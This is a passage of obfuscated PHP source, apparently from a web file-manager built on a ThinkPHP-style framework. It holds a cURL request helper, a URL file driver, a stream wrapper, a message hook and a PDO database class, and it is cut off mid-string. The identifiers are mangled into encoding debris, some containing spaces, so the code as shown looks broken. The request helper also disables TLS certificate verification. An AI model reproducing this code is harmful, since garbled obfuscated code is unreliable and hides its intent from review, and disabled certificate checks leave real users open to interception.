CURLOPT_CUSTOMREQUEST, $F±ßÃÔÓĞÒ); curl_setopt($eÕšÙ ƒÉ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto BèŞÒŞº¢Ø; c§Ş˜Š—Ö„: $B¸‰¯…í£í =& $_SERVER[¹÷ˆ§éÒ°ú]; $F‘Ü«¹ŸÈ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($B¸‰¯…í£í[1773], $B¸‰¯…í£í[60]); goto bìéêÏ²ç³; EçØ™èÖ§÷: curl_setopt($eÕšÙ ƒÉ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($eÕšÙ ƒÉ, CURLOPT_SSL_VERIFYHOST, !1); $f„šˆö÷­ƒ = curl_exec($eÕšÙ ƒÉ); goto aíÎ—ö¯êé; bìéêÏ²ç³: $this->setHeader($F‘Ü«¹ŸÈ); if ($D†òØŒ±¶“) { $D†òØŒ±¶“ = $B¸‰¯…í£í[1774] . $D†òØŒ±¶“; } if (!request_url_safe($EÇ‹çğ·)) { return !1; } goto féˆ‹Ñ¾£±; aíÎ—ö¯êé: $this->header = array(); return $f„šˆö÷­ƒ; goto Fô‚¼Ç›º¢; BèŞÒŞº¢Ø: curl_setopt($eÕšÙ ƒÉ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($eÕšÙ ƒÉ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($eÕšÙ ƒÉ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto EçØ™èÖ§÷; Fô‚¼Ç›º¢: } } goto Eã†ŒšÈ“Â; b÷Œ†‡Æ¦: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($c¯ñ‰›—‹‹ = false) { } public function exist($cù‡ˆ™¯) { $Fà‚ŞÙÃ = $this->info($cù‡ˆ™¯); return $Fà‚ŞÙÃ[$_SERVER[¹÷ˆ§éÒ°ú][200]]; } public function isFile($F‘¦“£¢ÅÍ) { $b‘£Ìğ¦µò = $this->info($F‘¦“£¢ÅÍ); return $b‘£Ìğ¦µò[$_SERVER[¹÷ˆ§éÒ°ú][200]]; } public function isFolder($Eáïá¾®ÇÏ) { return !1; } public function size($F½Ÿï×½Ò³) { $bŞùĞÒÓ×† = $this->info($F½Ÿï×½Ò³); return $bŞùĞÒÓ×†[$_SERVER[¹÷ˆ§éÒ°ú][89]]; } public function info($Dª³®÷ª÷Ÿ) { return $this->infoParse($Dª³®÷ª÷Ÿ); } public function infoAuth($cöºÆß…İ‰) { return $this->infoParse($cöºÆß…İ‰); } public function infoWithChildren($bÈÂŒ¦ëê‡) { return $this->infoParse($bÈÂŒ¦ëê‡); } public function infoFull($Fè·Á¤ö¸à) { return $this->infoParse($Fè·Á¤ö¸à); } private function infoParse($cèÎÒÜ»ù§) { $c˜Ã “—ÊÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $b…¦±Œ´Á = $this->header($cèÎÒÜ»ù§); if (!$b…¦±Œ´Á || !$b…¦±Œ´Á[$c˜Ã “—ÊÊ[684]]) { return !1; } $BÆøÇ’Şç = _get($b…¦±Œ´Á, $c˜Ã “—ÊÊ[336], 0); $BŞ¯é»£œÈ = array($c˜Ã “—ÊÊ[38] => $b…¦±Œ´Á[$c˜Ã “—ÊÊ[38]], $c˜Ã “—ÊÊ[87] => $cèÎÒÜ»ù§, $c˜Ã “—ÊÊ[39] => $c˜Ã “—ÊÊ[179], $c˜Ã “—ÊÊ[89] => intval($BÆøÇ’Şç), $c˜Ã “—ÊÊ[172] => get_path_ext($b…¦±Œ´Á[$c˜Ã “—ÊÊ[38]]), $c˜Ã “—ÊÊ[1153] => $BÆøÇ’Şç > 0 && $b…¦±Œ´Á[$c˜Ã “—ÊÊ[1279]], $c˜Ã “—ÊÊ[1154] => !1); return $BŞ¯é»£œÈ; } private function header($fŒ˜¿á¡é) { if (isset(self::$_cacheHeader[$fŒ˜¿á¡é])) { return self::$_cacheHeader[$fŒ˜¿á¡é]; } self::$_cacheHeader[$fŒ˜¿á¡é] = url_header($fŒ˜¿á¡é); return self::$_cacheHeader[$fŒ˜¿á¡é]; } public function hashSimple($cÂ§ˆÒš¢, $Bæ²ª¥ß÷ = false) { goto aè¬Ÿ£Œ³; b¡ĞóšãŞ¾: $bó‘Ñ›¥Îí .= $this->fileSubstr($cÂ§ˆÒš¢, $Cò®ïïƒã - $a½ßµ‰¹¥¿, $a½ßµ‰¹¥¿); return md5($bó‘Ñ›¥Îí) . $Cò®ïïƒã; goto b÷‘ñ¬†µĞ; Cš„´ä†: $Cò®ïïƒã = $A˜İİÀê[$F»Ì¶Ëåœä[89]]; $a½ßµ‰¹¥¿ = 200; $Cñùñô„ÅÙ = 50; goto AÄ“‹§Èâğ; aè¬Ÿ£Œ³: $F»Ì¶Ëåœä =& $_SERVER[¹÷ˆ§éÒ°ú]; $A˜İİÀê = $this->info($cÂ§ˆÒš¢); if (!$A˜İİÀê || !$A˜İİÀê[$F»Ì¶Ëåœä[200]]) { return !1; } goto Cš„´ä†; AÄ“‹§Èâğ: if ($Cò®ïïƒã <= $a½ßµ‰¹¥¿ * $Cñùñô„ÅÙ) { return md5($this->fileSubstr($cÂ§ˆÒš¢, 0, $Cò®ïïƒã)) . $Cò®ïïƒã; } $fÙÆä¯ç£¸ = intval($Cò®ïïƒã / $Cñùñô„ÅÙ); $bó‘Ñ›¥Îí = $F»Ì¶Ëåœä[43]; goto bŸ¬ˆ„°ã…; bŸ¬ˆ„°ã…: $aÔ¾Òï¯¬Ô = timeFloat(); $AŒ¢¡´®Š = 15; for ($f„œ÷­¶« = 0; $f„œ÷­¶« < $Cñùñô„ÅÙ; $f„œ÷­¶«++) { if (timeFloat() - $aÔ¾Òï¯¬Ô > $AŒ¢¡´®Š) { return !1; } $C«çÇÉæ¸Í = $this->fileSubstr($cÂ§ˆÒš¢, $fÙÆä¯ç£¸ * $f„œ÷­¶«, $a½ßµ‰¹¥¿); if (!$C«çÇÉæ¸Í) { return !1; } $bó‘Ñ›¥Îí .= $C«çÇÉæ¸Í; } goto b¡ĞóšãŞ¾; b÷‘ñ¬†µĞ: } public function getContent($c®îñˆ‰‰‘) { return $this->fileSubstr($c®îñˆ‰‰‘); } public function fileSubstr($B¼†ĞİÜŒÎ, $aˆº“ñŠöÏ = 0, $aùÉ´Äìæ“ = -1) { goto EÊèÆÓˆ³Å; EÊèÆÓˆ³Å: $f•‡´¨Óæ“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eíåÆŒÂ¬ = $this->info($B¼†ĞİÜŒÎ); if (!$eíåÆŒÂ¬ || !$eíåÆŒÂ¬[$f•‡´¨Óæ“[200]] && $eíåÆŒÂ¬[$f•‡´¨Óæ“[89]] > 1024 * 1024 * 10) { return !1; } goto eŞÇ˜ÍÂ; DÑ¯¡¾á©: $e‡Ş—Æ‚—© = url_request($B¼†ĞİÜŒÎ, $f•‡´¨Óæ“[228], !1, $dŞÈ¢™ùàæ, !1, !1, 1); return $e‡Ş—Æ‚—©[$f•‡´¨Óæ“[1025]] ? $e‡Ş—Æ‚—©[$f•‡´¨Óæ“[1025]] : $f•‡´¨Óæ“[43]; goto B×ø¢‰‘æ©; eŞÇ˜ÍÂ: if ($aùÉ´Äìæ“ === -1) { $aùÉ´Äìæ“ = $eíåÆŒÂ¬[$f•‡´¨Óæ“[89]]; } if ($aùÉ´Äìæ“ == 0) { return $f•‡´¨Óæ“[43]; } $dŞÈ¢™ùàæ = array($f•‡´¨Óæ“[1280] . $aˆº“ñŠöÏ . $f•‡´¨Óæ“[710] . ($aˆº“ñŠöÏ + $aùÉ´Äìæ“ - 1)); goto DÑ¯¡¾á©; B×ø¢‰‘æ©: } public function download($eâ„òêã°Ş, $AòÉõ¶±Î) { Downloader::start($eâ„òêã°Ş, $AòÉõ¶±Î); return $AòÉõ¶±Î; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($EÖªøÙÂ¿‚, $F´„°öøí = '') { goto eÆİ¯´•Ñ; Fôœ¾Æáõ: return $this->info ? !0 : !1; goto DºòŠö÷Ëò; dù‘‹È¹ŞŠ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$EÖªøÙÂ¿‚])) { self::$_chunkBuffer[$EÖªøÙÂ¿‚] = array(); } goto Fôœ¾Æáõ; eÆİ¯´•Ñ: $this->info = $this->info($EÖªøÙÂ¿‚); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹÷ˆ§éÒ°ú][87]]; goto dù‘‹È¹ŞŠ; DºòŠö÷Ëò: } function stream_read($b®Ó´Ú«†Ê) { $b£ ôÜÏ»å = $this->fileSubstr($this->pose, $b®Ó´Ú«†Ê); $this->pose += strlen($b£ ôÜÏ»å); return $b£ ôÜÏ»å; } public function stream_tell() { return $this->pose; } public function stream_seek($Aø“ˆ†Á§, $C­ª·­í) { $F½³¶çÁÖé =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($C­ª·­í == SEEK_SET) { $this->pose = $Aø“ˆ†Á§; } else { if ($C­ª·­í == SEEK_CUR) { $this->pose += $Aø“ˆ†Á§; } else { if ($C­ª·­í == SEEK_END) { $this->pose = $this->info[$F½³¶çÁÖé[89]] + intval($Aø“ˆ†Á§); } } } if ($Aø“ˆ†Á§ < 0) { $this->pose = $this->info[$F½³¶çÁÖé[89]] + $Aø“ˆ†Á§; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹÷ˆ§éÒ°ú][89]]; } public function stream_close() { return !0; } public function url_stat($cÂ‡«ğ£œó, $bÆÅ¤œ‘æ) { $FµÈàæî£³ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f“Œô˜Û£ß = $this->info($cÂ‡«ğ£œó); return array($FµÈàæî£³[1281] => 0, $FµÈàæî£³[1282] => 0, $FµÈàæî£³[22] => 32768 + 511, $FµÈàæî£³[1283] => 0, $FµÈàæî£³[1284] => 0, $FµÈàæî£³[1285] => 0, $FµÈàæî£³[1286] => 0, $FµÈàæî£³[89] => $f“Œô˜Û£ß[$FµÈàæî£³[89]], $FµÈàæî£³[1287] => $f“Œô˜Û£ß[$FµÈàæî£³[1159]], $FµÈàæî£³[1245] => $f“Œô˜Û£ß[$FµÈàæî£³[119]], $FµÈàæî£³[1244] => $f“Œô˜Û£ß[$FµÈàæî£³[199]], $FµÈàæî£³[1288] => 0, $FµÈàæî£³[1289] => 0); } static $fileInfo = array(); public function info($Cò°ä¡ŞÊŒ) { $CÌ­„®ÒÁĞ = $_SERVER[¹÷ˆ§éÒ°ú][1290]; if (isset(self::$fileInfo[$Cò°ä¡ŞÊŒ])) { return self::$fileInfo[$Cò°ä¡ŞÊŒ]; } if (substr($Cò°ä¡ŞÊŒ, 0, strlen($CÌ­„®ÒÁĞ)) != $CÌ­„®ÒÁĞ) { return !1; } self::$fileInfo[$Cò°ä¡ŞÊŒ] = IO::info(substr($Cò°ä¡ŞÊŒ, strlen($CÌ­„®ÒÁĞ))); return self::$fileInfo[$Cò°ä¡ŞÊŒ]; } public static function read($AÑøòÃõŸã, $Eƒ‚Å´‹, $bõğÈã«–) { goto f©øÌÜ×ä‡; F¼êåÕÑ¬ò: $BÛâÑìÔÚŠ = 8192; fseek($aÈóŠ¥«Î», $Eƒ‚Å´‹, SEEK_SET); $a®¯ë¶Î½ñ = $B¢Ÿôİ„ÙÖ[43]; goto BØÁ¢“Ï; CêëÈ‹Â İ: return $a®¯ë¶Î½ñ; goto e¯¶­˜·ˆÂ; BØÁ¢“Ï: $eÒ«­—„® = 0; while ($eÒ«­—„® < $bõğÈã«–) { $bğ‰Ö¼ˆ‰§ = min($BÛâÑìÔÚŠ, $bõğÈã«– - $eÒ«­—„®); $a®¯ë¶Î½ñ .= fread($aÈóŠ¥«Î», $bğ‰Ö¼ˆ‰§); $eÒ«­—„® += $bğ‰Ö¼ˆ‰§; } fclose($aÈóŠ¥«Î»); goto CêëÈ‹Â İ; f©øÌÜ×ä‡: $B¢Ÿôİ„ÙÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÈóŠ¥«Î» = fopen($AÑøòÃõŸã, $B¢Ÿôİ„ÙÖ[1161]); if (!$aÈóŠ¥«Î») { return $B¢Ÿôİ„ÙÖ[43]; } goto F¼êåÕÑ¬ò; e¯¶­˜·ˆÂ: } public function fileSubstr($B¨´ã©Ø’, $C’áÓ’Šù) { goto FÅù½†ô×; B¢öÚéäö–: $Dìç·ñìèÃ = $C’áÓ’Šù; if ($B¨´ã©Ø’ < 0) { $B¨´ã©Ø’ = $E±•£ï„¼¿ + $B¨´ã©Ø’; } if ($C’áÓ’Šù === !1) { $C’áÓ’Šù = $E±•£ï„¼¿ - $B¨´ã©Ø’; } goto D„ìùæ ¡Û; FÅù½†ô×: $D‚õÄÇ—ŠÛ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E±•£ï„¼¿ = $this->info[$D‚õÄÇ—ŠÛ[89]]; $B°—æ„›æ = $B¨´ã©Ø’; goto B¢öÚéäö–; Bçõï…¨Ä“: $cµ£ôÈÀì¬ = 0; $E±õ¥Úƒ = 0; $cİé‘Ñ©Û = $D‚õÄÇ—ŠÛ[43]; goto c®šÕŒêğ—; FñÖÙ¡Š³œ: $Cù–ğ–­× = ceil(($B¨´ã©Ø’ + $C’áÓ’Šù) / $C’‚¾·°ƒ¨) * $C’‚¾·°ƒ¨ - $eŒäµë±; $F­ª Æù¡Ÿ = IO::fileSubstr($this->path, $eŒäµë±, $Cù–ğ–­×); $F¤×’–º¥[$eŒäµë± . $D‚õÄÇ—ŠÛ[43]] = $F­ª Æù¡Ÿ; goto dè†ŒøÍ·Ñ; D„ìùæ ¡Û: if ($B¨´ã©Ø’ + $C’áÓ’Šù > $E±•£ï„¼¿) { $C’áÓ’Šù = $E±•£ï„¼¿ - $B¨´ã©Ø’; } if ($C’áÓ’Šù <= 0) { return $D‚õÄÇ—ŠÛ[43]; } if ($B¨´ã©Ø’ < 0 || $B¨´ã©Ø’ >= $E±•£ï„¼¿ || $C’áÓ’Šù <= 0 || $C’áÓ’Šù > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\x69\x6c\x65\x52\145\x61\x64\x20\145\162\x72\157\162\41\40\x73\x74\141\x72\164\x3d{$B¨´ã©Ø’}\73\154\145\x6e\147\x74\x68\75{$C’áÓ’Šù}\73\x20\163\x69\172\145\x3d{$E±•£ï„¼¿}\x3b"); } goto Dßëá‚¢Æã; Dßëá‚¢Æã: $C’‚¾·°ƒ¨ = 64 * 1024; $F¤×’–º¥ =& self::$_chunkBuffer[$this->path]; if (!$F¤×’–º¥) { $F¤×’–º¥ = array(); } goto Bçõï…¨Ä“; dè†ŒøÍ·Ñ: ksort($F¤×’–º¥); $CÖ‚ ²İŒÃ = substr($F­ª Æù¡Ÿ, $B¨´ã©Ø’ - $eŒäµë±, $C’áÓ’Šù); return $CÖ‚ ²İŒÃ; goto DŒ ßàè…·; c®šÕŒêğ—: foreach ($F¤×’–º¥ as $cµ£ôÈÀì¬ => $cİé‘Ñ©Û) { $cµ£ôÈÀì¬ = intval($cµ£ôÈÀì¬); $E±õ¥Úƒ = $cµ£ôÈÀì¬ + strlen($cİé‘Ñ©Û); if ($B¨´ã©Ø’ >= $E±õ¥Úƒ) { continue; } if ($B¨´ã©Ø’ >= $cµ£ôÈÀì¬ && $B¨´ã©Ø’ + $C’áÓ’Šù <= $E±õ¥Úƒ) { return substr($cİé‘Ñ©Û, $B¨´ã©Ø’ - $cµ£ôÈÀì¬, $C’áÓ’Šù); } break; } if (count($F¤×’–º¥) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($D‚õÄÇ—ŠÛ[1291], $D‚õÄÇ—ŠÛ[1292] . count($F¤×’–º¥) . "\73\163\164\141\162\164\75{$B¨´ã©Ø’}\x2c\x6c\x65\156\147\164\150\x3d{$C’áÓ’Šù}\73\160\157\163\x65\72{$cµ£ôÈÀì¬}\176{$E±õ¥Úƒ}"); throw new Exception($D‚õÄÇ—ŠÛ[1293]); } $eŒäµë± = intval($B¨´ã©Ø’ / $C’‚¾·°ƒ¨) * $C’‚¾·°ƒ¨; goto FñÖÙ¡Š³œ; DŒ ßàè…·: } private function log($fğçù…÷¥´, $C±ç¿é‚É) { $CÖ”® ãœá =& $_SERVER[¹÷ˆ§éÒ°ú]; $A¦åº—ÀÚ = timeFloat() - $this->timeStart; write_log(sprintf($CÖ”® ãœá[1294], $fğçù…÷¥´, $this->info[$CÖ”® ãœá[38]], $A¦åº—ÀÚ, $C±ç¿é‚É), $CÖ”® ãœá[1210]); } } class Message { function __construct() { } public function send($eõ¿³µè¢¢ = '', $CÖ®Ô¶ñƒ = array(), $cƒ‡šààëÅ = "\x74\145\x78\164") { goto C…„ã°âø½; fæ‹Œˆ—šÅ: Hook::trigger($a‘ßÌÇŠ[1298], $A¢×Õ„éî¡); goto fá“Õ†ƒ†½; C…„ã°âø½: $a‘ßÌÇŠ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CëåŸóšºß = array($a‘ßÌÇŠ[39] => $a‘ßÌÇŠ[1295], $a‘ßÌÇŠ[687] => $eõ¿³µè¢¢); if (in_array($cƒ‡šààëÅ, array($a‘ßÌÇŠ[1295], $a‘ßÌÇŠ[1296]))) { $CëåŸóšºß[$a‘ßÌÇŠ[39]] = $cƒ‡šààëÅ; } goto bİãŞì›; bİãŞì›: $CÖ®Ô¶ñƒ = array($a‘ßÌÇŠ[961] => isset($CÖ®Ô¶ñƒ[$a‘ßÌÇŠ[961]]) ? $CÖ®Ô¶ñƒ[$a‘ßÌÇŠ[961]] : $a‘ßÌÇŠ[43], $a‘ßÌÇŠ[548] => isset($CÖ®Ô¶ñƒ[$a‘ßÌÇŠ[548]]) ? $CÖ®Ô¶ñƒ[$a‘ßÌÇŠ[548]] : $a‘ßÌÇŠ[43]); if (empty($eõ¿³µè¢¢) || empty($CÖ®Ô¶ñƒ[$a‘ßÌÇŠ[961]]) && empty($CÖ®Ô¶ñƒ[$a‘ßÌÇŠ[548]])) { return !1; } $A¢×Õ„éî¡ = array($a‘ßÌÇŠ[1237] => $CëåŸóšºß, $a‘ßÌÇŠ[1297] => $CÖ®Ô¶ñƒ); goto fæ‹Œˆ—šÅ; fá“Õ†ƒ†½: } } goto fòìœœÆœİ; E±õ«§„›ê: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C‚†ÊÒÅÃ„ = '') { $e‚òËù•Ã— =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!class_exists($e‚òËù•Ã—[816])) { think_exception(think_lang($e‚òËù•Ã—[20]) . $e‚òËù•Ã—[817]); } if (!empty($C‚†ÊÒÅÃ„)) { $this->config = $C‚†ÊÒÅÃ„; if (empty($this->config[$e‚òËù•Ã—[23]])) { $this->config[$e‚òËù•Ã—[23]] = array(); } } } public function connect($e‰œø£¦‡† = '', $F­ÓËØÈ£‚ = 0) { $Fğä¯Ë–†ä =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->linkID[$F­ÓËØÈ£‚])) { goto b÷ÁÂ‰Ëğ£; d¢å¶ï­É¢: $this->dbType = $this->_getDsnType($e‰œø£¦‡†[$Fğä¯Ë–†ä[818]]); if (in_array($this->dbType, array($Fğä¯Ë–†ä[819], $Fğä¯Ë–†ä[820], $Fğä¯Ë–†ä[821], $Fğä¯Ë–†ä[822]))) { think_exception($Fğä¯Ë–†ä[823] . $this->dbType . $Fğä¯Ë–†ä[824] . $this->dbType . $Fğä¯Ë–†ä[825]); } if (!$this->linkID[$F­ÓËØÈ£‚]) { think_exception($Fğä¯Ë–†ä[826]); } goto d‰ä›ÌÖ¼ï; b÷ÁÂ‰Ëğ£: if (empty($e‰œø£¦‡†)) { $e‰œø£¦‡† = $this->config; } if ($this->pconnect) { $e‰œø£¦‡†[$Fğä¯Ë–†ä[23]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$F­ÓËØÈ£‚] = new PDO($e‰œø£¦‡†[$Fğä¯Ë–†ä[818]], $e‰œø£¦‡†[$Fğä¯Ë–†ä[791]], $e‰œø£¦‡†[$Fğä¯Ë–†ä[792]], $e‰œø£¦‡†[$Fğä¯Ë–†ä[23]]); } catch (PDOException $a‹–Ü…ËÍ) { think_exception($a‹–Ü…ËÍ->getMessage()); } goto d¢å¶ï­É¢; d‰ä›ÌÖ¼ï: $this->linkID[$F­ÓËØÈ£‚]->exec($Fğä¯Ë–†ä[827] . think_config($Fğä¯Ë–†ä[794])); $this->connected = !0; if (1 != think_config($Fğä¯Ë–†ä[28])) { unset($this->config); } goto BïÆ‰Â°Çø; BïÆ‰Â°Çø: } return $this->linkID[$F­ÓËØÈ£‚]; } public function free() { $this->PDOStatement = null; } public function query($F¶ğ¬­ËÚö, $f©Í—ñâ›í = array()) { goto B‘Ÿ¿ŠĞÏÆ; f…¿Ìã»õ: if (!1 === $FíÂèŠÉİ) { $this->error(); return !1; } else { return $this->getAll(); } goto eØğøºƒ; bÒùá÷¸œË: $this->queryStr = $F¶ğ¬­ËÚö; if (!empty($f©Í—ñâ›í)) { $this->queryStr .= $F„º¶—Ï“…[828] . print_r($f©Í—ñâ›í, !0) . $F„º¶—Ï“…[829]; } if (!empty($this->PDOStatement)) { $this->free(); } goto a…åœÁŠò„; a…åœÁŠò„: think_action_status($F„º¶—Ï“…[29], 1); think_status($F„º¶—Ï“…[30]); $this->PDOStatement = $this->_linkID->prepare($F¶ğ¬­ËÚö); goto d×óÔªØğŞ; B‘Ÿ¿ŠĞÏÆ: $F„º¶—Ï“… =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÒùá÷¸œË; d×óÔªØğŞ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $FíÂèŠÉİ = $this->PDOStatement->execute($f©Í—ñâ›í); $this->debug(); goto f…¿Ìã»õ; eØğøºƒ: } public function execute($bÉÌß¿äóé, $a¨ŠÈ©ƒö§ = array()) { goto Dùà˜Ş’ğ‹; bÖ°Ø…ë‡®: $få˜Ê§¿é» = $this->PDOStatement->execute($a¨ŠÈ©ƒö§); $this->debug(); if (!1 === $få˜Ê§¿é») { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($fÈŸšöˆšõ || preg_match($dã´†˜¦Í¶[834], $bÉÌß¿äóé)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Aœ½»ïŠ­Ö; DœÒÏÙóë÷: think_status($dã´†˜¦Í¶[30]); $this->PDOStatement = $this->_linkID->prepare($bÉÌß¿äóé); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto bÖ°Ø…ë‡®; F„˜»ªä¹Ï: $this->queryStr = $bÉÌß¿äóé; if (!empty($a¨ŠÈ©ƒö§)) { $this->queryStr .= $dã´†˜¦Í¶[828] . print_r($a¨ŠÈ©ƒö§, !0) . $dã´†˜¦Í¶[829]; } $fÈŸšöˆšõ = !1; goto F…ŒÜÂ‹‡Ú; Dùà˜Ş’ğ‹: $dã´†˜¦Í¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F„˜»ªä¹Ï; F…ŒÜÂ‹‡Ú: if ($this->dbType == $dã´†˜¦Í¶[822]) { if (preg_match($dã´†˜¦Í¶[830], $this->queryStr, $Bï›ÎÆ·ì›)) { $this->table = think_config($dã´†˜¦Í¶[831]) . str_ireplace(think_config($dã´†˜¦Í¶[832]), $dã´†˜¦Í¶[372], $Bï›ÎÆ·ì›[2]); $fÈŸšöˆšõ = (bool) $this->query($dã´†˜¦Í¶[833] . strtoupper($this->table) . $dã´†˜¦Í¶[67]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($dã´†˜¦Í¶[31], 1); goto DœÒÏÙóë÷; Aœ½»ïŠ­Ö: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÉ¿¶²Š±÷ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dÉ¿¶²Š±÷) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E›®Šõ…àë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$E›®Šõ…àë) { $this->error(); return !1; } } return !0; } private function getAll() { $FêÕŠÊâŠô = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($FêÕŠÊâŠô); return $FêÕŠÊâŠô; } public function getFields($BäÚ„§É©) { goto F“Š—ˆ¥Ú; d†Ëâ¼—Ş‘: return $d™·ïµ¢§Ï; goto dŸÃ´èì¼ã; fÍ‚ˆšŒñ¡: $cîÔ…¥¢”É = $this->query($ağ¯öêñÊ³); $d™·ïµ¢§Ï = array(); if ($cîÔ…¥¢”É) { foreach ($cîÔ…¥¢”É as $Dˆ˜¨ˆ¨…§ => $DßÔÓÛ÷„Ë) { $DßÔÓÛ÷„Ë = array_change_key_case($DßÔÓÛ÷„Ë); $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[38]] = isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[38]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[38]] : $F¨ª³×Äò¾[372]; $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[39]] = isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[39]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[39]] : $F¨ª³×Äò¾[372]; $e‡Ò²ìÚöĞ = isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[272]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[272]] : $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[38]]; $d™·ïµ¢§Ï[$e‡Ò²ìÚöĞ] = array($F¨ª³×Äò¾[38] => $e‡Ò²ìÚöĞ, $F¨ª³×Äò¾[39] => $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[39]], $F¨ª³×Äò¾[41] => (bool) (isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[111]]) && $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[111]] === $F¨ª³×Äò¾[43] || isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[41]]) && $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[41]] === $F¨ª³×Äò¾[43]), $F¨ª³×Äò¾[44] => isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[44]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[44]] : (isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[65]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[65]] : $F¨ª³×Äò¾[372]), $F¨ª³×Äò¾[46] => isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[101]]) ? strtolower($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[101]]) == $F¨ª³×Äò¾[48] : (isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[66]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[66]] : !1), $F¨ª³×Äò¾[49] => isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[851]]) ? strtolower($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[851]]) == $F¨ª³×Äò¾[51] : (isset($DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[101]]) ? $DßÔÓÛ÷„Ë[$F¨ª³×Äò¾[101]] : !1)); } } goto d†Ëâ¼—Ş‘; F“Š—ˆ¥Ú: $F¨ª³×Äò¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->initConnect(!0); if (think_config($F¨ª³×Äò¾[835])) { $ağ¯öêñÊ³ = str_replace($F¨ª³×Äò¾[836], $BäÚ„§É©, think_config($F¨ª³×Äò¾[835])); } else { switch ($this->dbType) { case $F¨ª³×Äò¾[819]: case $F¨ª³×Äò¾[837]: $ağ¯öêñÊ³ = "\123\x45\x4c\105\103\124\40\40\x20\x63\x6f\154\165\x6d\156\x5f\156\141\x6d\x65\x20\x61\x73\40\47\116\x61\155\x65\47\x2c\x20\x20\x20\144\141\164\141\137\164\171\x70\x65\x20\141\163\40\47\x54\171\160\145\x27\x2c\x20\x20\40\143\157\x6c\165\155\156\x5f\144\x65\x66\141\165\x6c\164\x20\x61\163\40\47\104\145\x66\141\165\x6c\164\47\54\40\x20\x20\151\x73\x5f\x6e\x75\154\154\x61\x62\154\x65\x20\x61\x73\40\x27\116\165\x6c\x6c\x27\12\11\x9\x46\122\x4f\115\x9\151\156\146\x6f\162\x6d\x61\164\x69\157\x6e\x5f\x73\143\150\x65\x6d\x61\x2e\164\141\142\x6c\145\163\x20\x41\x53\x20\164\12\11\11\x4a\117\x49\116\x9\x69\x6e\146\157\x72\x6d\141\164\151\157\156\x5f\x73\x63\150\145\155\141\x2e\143\x6f\154\x75\x6d\156\x73\40\101\x53\40\143\12\11\11\117\116\x20\x20\x74\x2e\x74\x61\x62\154\145\137\x63\x61\164\x61\154\x6f\147\40\x3d\40\x63\56\x74\x61\x62\154\x65\137\x63\x61\164\x61\x6c\157\x67\12\x9\x9\101\116\x44\x20\164\56\x74\141\x62\154\145\x5f\x73\143\150\145\x6d\141\x20\75\40\x63\56\164\141\142\154\x65\137\x73\x63\150\145\x6d\x61\xa\x9\x9\x41\116\104\x20\164\x2e\164\141\142\154\145\x5f\x6e\141\155\x65\x20\75\x20\x63\56\x74\x61\